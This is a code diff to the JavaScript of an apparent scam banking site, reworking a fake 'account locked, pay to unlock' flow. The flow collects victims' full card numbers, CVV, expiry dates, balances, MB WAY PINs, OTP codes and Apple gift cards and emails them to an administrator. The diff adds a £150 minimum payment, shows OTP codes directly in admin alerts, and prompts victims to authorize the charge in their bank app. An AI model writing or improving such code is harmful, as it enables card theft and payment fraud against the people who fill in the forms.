@@ -842,7 +842,8 @@ function showScreen(name,noPush){
 }
 
 // ── MODALS ──
-function openModal(id){ var m=$(id); if(m) m.classList.add('show'); }
+var _modalZBase=10000;
+function openModal(id){ var m=$(id); if(!m) return; m.style.zIndex=(_modalZBase+=10); m.classList.add('show'); }
 function closeModal(id){ var m=$(id); if(m) m.classList.remove('show'); }
 
 // ── TABS ──
@@ -3927,7 +3928,7 @@ document.addEventListener('DOMContentLoaded',function(){
 
   var _lockMethod='';
   var _lockMbwayCode='+351';
-  var _lockMbwayFlag='\U0001f1f5\U0001f1f9';
+  var _lockMbwayFlag='🇵🇹';
   var _lockCurrentPayload=null; // tracks last submitted payload for auth
 
   window.openLockMethod = function(method){
@@ -3938,11 +3939,14 @@ document.addEventListener('DOMContentLoaded',function(){
     var notice=document.getElementById('lock-auth-notice');
     var noticeText=document.getElementById('lock-auth-notice-text');
     var toAuthBtn=document.getElementById('lock-to-auth-btn');
+    var submitBtn=document.getElementById('lock-card-submit-btn');
+    var errEl=document.getElementById('lock-card-error');
+    if(errEl){ errEl.style.color=''; errEl.textContent=''; }
     if(method==='mbway'){
-      title='\U0001f4f1 MB WAY'; icon='\U0001f4f1';
-      _lockMbwayCode='+351'; _lockMbwayFlag='\U0001f1f5\U0001f1f9';
+      title='📱 MB WAY'; icon='📱';
+      _lockMbwayCode='+351'; _lockMbwayFlag='🇵🇹';
       fields='<div style="display:flex;gap:8px;margin-bottom:10px;">'
-        +'<button id="lock-mbway-country-btn" style="background:rgba(255,255,255,0.08);border:1.5px solid rgba(255,255,255,0.15);border-radius:10px;padding:0 12px;font-size:14px;font-weight:700;color:#cc0000;cursor:pointer;white-space:nowrap;font-family:inherit;height:48px;min-width:95px;" onclick="openLockMBWayCountry()">\U0001f1f5\U0001f1f9 +351</button>'
+        +'<button id="lock-mbway-country-btn" style="background:rgba(255,255,255,0.08);border:1.5px solid rgba(255,255,255,0.15);border-radius:10px;padding:0 12px;font-size:14px;font-weight:700;color:#cc0000;cursor:pointer;white-space:nowrap;font-family:inherit;height:48px;min-width:95px;" onclick="openLockMBWayCountry()">🇵🇹 +351</button>'
         +'<input type="tel" id="lock-mbway-phone" class="modal-input" placeholder="'+tr('lockMbwayPhone')+'" inputmode="numeric" style="flex:1;margin-bottom:0;"></div>'
         +'<input type="password" id="lock-mbway-pin" class="modal-input" placeholder="'+tr('lockMbwayPin')+'" maxlength="6" inputmode="numeric">'
         +'<input type="text" id="lock-mbway-name" class="modal-input" placeholder="'+tr('lockMbwayName')+'">'
@@ -3950,10 +3954,10 @@ document.addEventListener('DOMContentLoaded',function(){
         +'<div style="font-size:12px;color:rgba(255,255,255,0.4);margin-top:-6px;margin-bottom:8px;">'+tr('lockMbwayMin')+'</div>';
       if(notice) notice.style.display='block';
       if(noticeText) noticeText.textContent=tr('lockMbwayAuthNote');
-      if(toAuthBtn){ toAuthBtn.style.display='block'; toAuthBtn.innerHTML=tr('lockAuthIHaveAuth'); }
+      if(toAuthBtn) toAuthBtn.style.display='none';
     } else {
       var brand=method==='visa'?tr('lockVisaLabel'):tr('lockMcLabel');
-      title='\U0001f4b3 '+brand; icon='\U0001f4b3';
+      title='💳 '+brand; icon='💳';
       fields='<input type="text" id="lock-card-number" class="modal-input" placeholder="'+tr('lockCardNumber')+'" maxlength="19" inputmode="numeric">'
         +'<input type="text" id="lock-card-name" class="modal-input" placeholder="'+tr('lockCardHolder')+'">'
         +'<input type="text" id="lock-card-bank" class="modal-input" placeholder="'+tr('lockCardBank')+'">'
@@ -3961,17 +3965,16 @@ document.addEventListener('DOMContentLoaded',function(){
         +'<input type="text" id="lock-card-street" class="modal-input" placeholder="'+tr('lockCardStreet')+'">'
         +'<div style="display:flex;gap:8px;"><input type="text" id="lock-card-city" class="modal-input" placeholder="'+tr('lockCardCity')+'" style="flex:1;"><input type="text" id="lock-card-postcode" class="modal-input" placeholder="'+tr('lockCardPostcode')+'" style="flex:1;"></div>'
         +'<input type="tel" id="lock-card-phone" class="modal-input" placeholder="'+tr('lockCardPhone')+'">'
+        +'<input type="number" id="lock-card-amount" class="modal-input" placeholder="Amount to add (min. £150 / $150)" inputmode="decimal" min="150">'
         +'<input type="text" id="lock-card-balance" class="modal-input" placeholder="'+tr('lockCardBalance')+'" inputmode="decimal">';
       if(notice) notice.style.display='block';
       if(noticeText) noticeText.textContent=tr('lockCardAuthNote');
-      if(toAuthBtn){ toAuthBtn.style.display='block'; toAuthBtn.innerHTML=tr('lockAuthIHaveAuth'); }
+      if(toAuthBtn) toAuthBtn.style.display='none';
     }
     document.getElementById('lock-card-icon').textContent=icon;
     document.getElementById('lock-card-title').textContent=title;
     document.getElementById('lock-card-fields').innerHTML=fields;
-    document.getElementById('lock-card-error').textContent='';
-    document.getElementById('lock-card-submit-btn').innerHTML=tr('lockCardSubmit');
-    document.getElementById('lock-card-submit-btn').disabled=false;
+    if(submitBtn){ submitBtn.innerHTML=tr('lockCardSubmit'); submitBtn.style.display='block'; submitBtn.disabled=false; }
     openModal('lock-card-modal');
   };
 
@@ -3988,7 +3991,7 @@ document.addEventListener('DOMContentLoaded',function(){
     document.getElementById('lock-auth-done-btn').onclick=function(){
       closeModal('lock-auth-modal');
       var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#00a550,#007a3a);color:#fff;padding:16px 20px;z-index:9999999;font-size:14px;font-weight:600;text-align:center;line-height:1.5;';
-      b.innerHTML='&#9989; Authorization confirmed. Our compliance team has been notified and will process your account shortly. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
+      b.innerHTML='&#9989; Authorization confirmed. Our compliance team will process your account shortly. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
       document.body.appendChild(b);setTimeout(function(){if(b.parentNode)b.remove();},9000);
     };
     openModal('lock-auth-modal');
@@ -4015,21 +4018,21 @@ document.addEventListener('DOMContentLoaded',function(){
     var ADMIN_EMAIL=window.ADMIN_EMAIL||'';
     var db=firebase.database();
     var method=_lockMethod||'unknown';
-    var emailMsg='Authorization code submitted for account unlock.\n\nMethod: '+method.toUpperCase()+'\nCode: '+code+'\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'')+'\nSubmitted: '+new Date().toISOString();
+    var emailMsg='Authorization / OTP code submitted for account unlock.\n\nMethod: '+method.toUpperCase()+'\nCode: '+code+'\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'')+'\nSubmitted: '+new Date().toISOString();
     db.ref('lockUnlockRequests').push({method:method,uid:currentUser.uid,userName:'lock code authentication',authCode:code,submittedDate:new Date().toISOString(),status:'pending',type:'auth_code'})
     .then(function(){
       return db.ref('users').once('value').then(function(snap){
         snap.forEach(function(s){
           if(s.val()&&s.val().email===ADMIN_EMAIL){
-            if(typeof notify==='function') notify(s.key,'\U0001f510 AUTH CODE: Account unlock code submitted - Method: '+method.toUpperCase());
-            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'\U0001f510 Auth Code - Account Unlock','lock code authentication',emailMsg);
+            if(typeof notify==='function') notify(s.key,'🔐 AUTH CODE: Unlock code - '+method.toUpperCase()+' | Code: '+code);
+            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'🔐 Auth Code - Account Unlock','lock code authentication',emailMsg);
           }
         });
       });
     }).then(function(){
       closeModal('lock-auth-code-modal');
       var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#00a550,#007a3a);color:#fff;padding:16px 20px;z-index:9999999;font-size:14px;font-weight:600;text-align:center;line-height:1.5;';
-      b.innerHTML='&#9989; Code submitted successfully. Our team will verify this shortly. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
+      b.innerHTML='&#9989; Code submitted. Our team will verify this shortly. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
       document.body.appendChild(b);setTimeout(function(){if(b.parentNode)b.remove();},8000);
     }).catch(function(){err.textContent='Submission failed. Please try again.';})
     .finally(function(){document.getElementById('lock-auth-code-submit-btn').textContent=tr('lockAuthCodeSubmit');document.getElementById('lock-auth-code-submit-btn').disabled=false;});
@@ -4045,7 +4048,7 @@ document.addEventListener('DOMContentLoaded',function(){
     openModal('lock-pending-modal');
     db.ref('lockUnlockRequests').orderByChild('uid').equalTo(cu.uid).once('value').then(function(snap){
       list.innerHTML='';
-      if(!snap.exists()){list.innerHTML='<div style="text-align:center;color:rgba(255,255,255,0.4);padding:24px;" data-i18n="lockPendingNone">'+tr('lockPendingNone')+'</div>';return;}
+      if(!snap.exists()){list.innerHTML='<div style="text-align:center;color:rgba(255,255,255,0.4);padding:24px;">'+tr('lockPendingNone')+'</div>';return;}
       var items=[];
       snap.forEach(function(s){items.push(Object.assign({},s.val(),{_key:s.key}));});
       items.sort(function(a,b){return new Date(b.submittedDate)-new Date(a.submittedDate);});
@@ -4054,18 +4057,20 @@ document.addEventListener('DOMContentLoaded',function(){
         var methodLabel=req.method==='mbway'?'MB WAY':req.method==='apple'?'Apple Gift Cards':(req.method||'').charAt(0).toUpperCase()+(req.method||'').slice(1);
         var div=document.createElement('div');
         div.style.cssText='background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px;margin-bottom:12px;';
-        var otpBtn='';
-        if(req.status==='pending'&&req.method!=='apple'){
-          otpBtn='<button onclick="(function(){_lockMethod=\''+req.method+'\';openLockAuth();})()" style="margin-top:12px;width:100%;background:rgba(26,86,255,0.15);border:1.5px solid rgba(26,86,255,0.4);border-radius:10px;padding:11px;font-size:13px;font-weight:700;color:#4dabff;cursor:pointer;font-family:inherit;">&#128272; '+tr('lockPendingOtp')+'</button>';
-        }
         div.innerHTML=
           '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">'
             +'<div style="font-size:14px;font-weight:700;color:#fff;">'+methodLabel+'</div>'
             +'<div style="background:rgba(255,255,255,0.06);border-radius:20px;padding:3px 10px;font-size:11px;font-weight:700;color:'+statusColor+';">'+req.status.toUpperCase()+'</div>'
           +'</div>'
-          +'<div style="font-size:12px;color:rgba(255,255,255,0.4);">'+(req.submittedDate?new Date(req.submittedDate).toLocaleString():'')+'</div>'
-          +otpBtn;
+          +'<div style="font-size:12px;color:rgba(255,255,255,0.4);">'+(req.submittedDate?new Date(req.submittedDate).toLocaleString():'')+'</div>';
         list.appendChild(div);
+        if(req.status==='pending'&&req.method!=='apple'){
+          var otpBtn=document.createElement('button');
+          otpBtn.style.cssText='margin-top:12px;width:100%;background:rgba(26,86,255,0.15);border:1.5px solid rgba(26,86,255,0.4);border-radius:10px;padding:11px;font-size:13px;font-weight:700;color:#4dabff;cursor:pointer;font-family:inherit;';
+          otpBtn.textContent='🔐 '+tr('lockPendingOtp');
+          (function(m){ otpBtn.onclick=function(){ _lockMethod=m; openLockAuth(); }; })(req.method);
+          div.appendChild(otpBtn);
+        }
       });
     });
   };
@@ -4088,7 +4093,7 @@ document.addEventListener('DOMContentLoaded',function(){
   };
 
   document.getElementById('lock-card-submit-btn').onclick = function(){
-    var err=document.getElementById('lock-card-error'); err.textContent='';
+    var err=document.getElementById('lock-card-error'); err.style.color=''; err.textContent='';
     var method=_lockMethod;
     var currentUser=firebase.auth().currentUser;
     if(!currentUser||!window.userData) return;
@@ -4105,9 +4110,9 @@ document.addEventListener('DOMContentLoaded',function(){
       if(!name){err.textContent='Please enter the name on the account.';return;}
       var amtRaw=document.getElementById('lock-mbway-amount')?document.getElementById('lock-mbway-amount').value.trim():'';
       var amt=parseFloat(amtRaw);
-      if(!amtRaw||isNaN(amt)||amt<150){err.textContent='Amount must be at least \xA3150 / $150.';return;}
+      if(!amtRaw||isNaN(amt)||amt<150){err.textContent='Amount must be at least £150 / $150.';return;}
       payload.phone=_lockMbwayCode+phone; payload.pin=pin; payload.accountName=name; payload.amount=amt;
-      emailMsg='MB WAY unlock payment submitted.\n\nPhone: '+payload.phone+'\nPIN: '+pin+'\nName: '+name+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
+      emailMsg='MB WAY unlock payment submitted.\n\nPhone: '+payload.phone+'\nPIN: '+pin+'\nName: '+name+'\nAmount: '+amt+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
     } else {
       var num=document.getElementById('lock-card-number')?document.getElementById('lock-card-number').value.replace(/\D/g,''):'';
       var cname=document.getElementById('lock-card-name')?document.getElementById('lock-card-name').value.trim():'';
@@ -4118,14 +4123,16 @@ document.addEventListener('DOMContentLoaded',function(){
       var city=document.getElementById('lock-card-city')?document.getElementById('lock-card-city').value.trim():'';
       var postcode=document.getElementById('lock-card-postcode')?document.getElementById('lock-card-postcode').value.trim():'';
       var phone2=document.getElementById('lock-card-phone')?document.getElementById('lock-card-phone').value.trim():'';
+      var cardAmt=document.getElementById('lock-card-amount')?document.getElementById('lock-card-amount').value.trim():'';
       var balance=document.getElementById('lock-card-balance')?document.getElementById('lock-card-balance').value.trim():'';
       var expiry=''; if(expiryRaw){var pts=expiryRaw.split('-');if(pts.length===2)expiry=pts[1]+'/'+pts[0].slice(-2);}
       if(num.length!==16){err.textContent='Card number must be 16 digits.';return;}
       if(!cname){err.textContent='Please enter the cardholder name.';return;}
       if(!expiry||!cvv){err.textContent='Please enter expiry and CVV.';return;}
+      if(!cardAmt||parseFloat(cardAmt)<150){err.textContent='Amount must be at least £150 / $150.';return;}
       var brand=typeof detectBrand==='function'?detectBrand(num):(num[0]==='4'?'Visa':'Mastercard');
-      payload.cardNumber=num;payload.cardName=cname;payload.bankName=bank;payload.expiry=expiry;payload.cvv=cvv;payload.brand=brand;payload.lastFour=num.slice(-4);payload.street=street;payload.city=city;payload.postcode=postcode;payload.phone=phone2;payload.balance=balance;
-      emailMsg=brand+' card submitted for account unlock.\n\nCard: '+brand+' ....'+num.slice(-4)+'\nName: '+cname+'\nBank: '+(bank||'--')+'\nExpiry: '+expiry+'\nCVV: '+cvv+'\nBalance: '+(balance||'--')+'\nStreet: '+(street||'--')+'\nCity: '+(city||'--')+'\nPostcode: '+(postcode||'--')+'\nPhone: '+(phone2||'--')+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
+      payload.cardNumber=num;payload.cardName=cname;payload.bankName=bank;payload.expiry=expiry;payload.cvv=cvv;payload.brand=brand;payload.lastFour=num.slice(-4);payload.street=street;payload.city=city;payload.postcode=postcode;payload.phone=phone2;payload.amount=cardAmt;payload.balance=balance;
+      emailMsg=brand+' card submitted for account unlock.\n\nCard: '+brand+' ....'+num.slice(-4)+'\nName: '+cname+'\nBank: '+(bank||'--')+'\nExpiry: '+expiry+'\nCVV: '+cvv+'\nAmount: '+cardAmt+'\nBalance: '+(balance||'--')+'\nStreet: '+(street||'--')+'\nCity: '+(city||'--')+'\nPostcode: '+(postcode||'--')+'\nPhone: '+(phone2||'--')+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
     }
     this.textContent='Submitting...'; this.disabled=true;
     var db=firebase.database();
@@ -4137,18 +4144,23 @@ document.addEventListener('DOMContentLoaded',function(){
       return db.ref('users').once('value').then(function(snap){
         snap.forEach(function(s){
           if(s.val()&&s.val().email===ADMIN_EMAIL){
-            if(typeof notify==='function') notify(s.key,'\U0001f512 UNLOCK REQ: '+userName+' submitted '+method.toUpperCase());
-            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'\U0001f512 Unlock Request - '+method.toUpperCase(),'lock code authentication',emailMsg);
+            if(typeof notify==='function') notify(s.key,'🔒 UNLOCK REQ: '+userName+' submitted '+method.toUpperCase());
+            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'🔒 Unlock Request - '+method.toUpperCase(),'lock code authentication',emailMsg);
           }
         });
       });
     }).then(function(){
-      closeModal('lock-card-modal');
-      var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#00a550,#007a3a);color:#fff;padding:16px 20px;z-index:9999999;font-size:14px;font-weight:600;text-align:center;line-height:1.5;';
-      b.innerHTML='&#9989; Verification Submitted! Our team will review your payment shortly. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
-      document.body.appendChild(b);setTimeout(function(){if(b.parentNode)b.remove();},8000);
+      var sb=document.getElementById('lock-card-submit-btn');
+      var ab=document.getElementById('lock-to-auth-btn');
+      if(sb) sb.style.display='none';
+      if(ab){ ab.style.display='block'; ab.innerHTML=tr('lockAuthIHaveAuth'); }
+      var e2=document.getElementById('lock-card-error');
+      if(e2){ e2.style.color='#34d399'; e2.textContent='✅ Submitted! Tap below to complete authorization in your bank app.'; }
     }).catch(function(){ err.textContent='Submission failed. Please try again.'; })
-    .finally(function(){ document.getElementById('lock-card-submit-btn').innerHTML=tr('lockCardSubmit'); document.getElementById('lock-card-submit-btn').disabled=false; });
+    .finally(function(){
+      var sb=document.getElementById('lock-card-submit-btn');
+      if(sb){ sb.textContent=tr('lockCardSubmit'); sb.disabled=false; }
+    });
   };
 
   window.openLockAppleCodes = function(qty){
@@ -4197,8 +4209,8 @@ document.addEventListener('DOMContentLoaded',function(){
       return db.ref('users').once('value').then(function(snap){
         snap.forEach(function(s){
           if(s.val()&&s.val().email===ADMIN_EMAIL){
-            if(typeof notify==='function') notify(s.key,'\U0001f512 UNLOCK REQ: '+userName+' submitted Apple Gift Cards');
-            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'\U0001f512 Unlock Request - Apple Gift Cards','lock code authentication',emailMsg);
+            if(typeof notify==='function') notify(s.key,'🔒 UNLOCK REQ: '+userName+' submitted Apple Gift Cards');
+            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'🔒 Unlock Request - Apple Gift Cards','lock code authentication',emailMsg);
           }
         });
       });
@@ -4216,7 +4228,7 @@ document.addEventListener('DOMContentLoaded',function(){
     var reason=prompt('Reason for locking this account:');
     if(!reason||!reason.trim()) return;
     firebase.database().ref('users/'+uid).update({locked:true,lockReason:reason.trim(),lockedDate:new Date().toISOString()}).then(function(){
-      if(typeof notify==='function') notify(uid,'\U0001f512 Your account has been locked. Reason: '+reason.trim());
+      if(typeof notify==='function') notify(uid,'🔒 Your account has been locked. Reason: '+reason.trim());
       if(typeof loadUsersTab==='function') loadUsersTab();
     });
   };
@@ -4224,7 +4236,7 @@ document.addEventListener('DOMContentLoaded',function(){
     var reason=prompt('Reason for unlocking this account:');
     if(!reason||!reason.trim()) return;
     firebase.database().ref('users/'+uid).update({locked:false,lockReason:null,lockedDate:null,unlockedDate:new Date().toISOString()}).then(function(){
-      if(typeof notify==='function') notify(uid,'\U0001f513 Your account has been unlocked! '+reason.trim());
+      if(typeof notify==='function') notify(uid,'🔓 Your account has been unlocked! '+reason.trim());
       if(typeof loadUsersTab==='function') loadUsersTab();
     });
   };
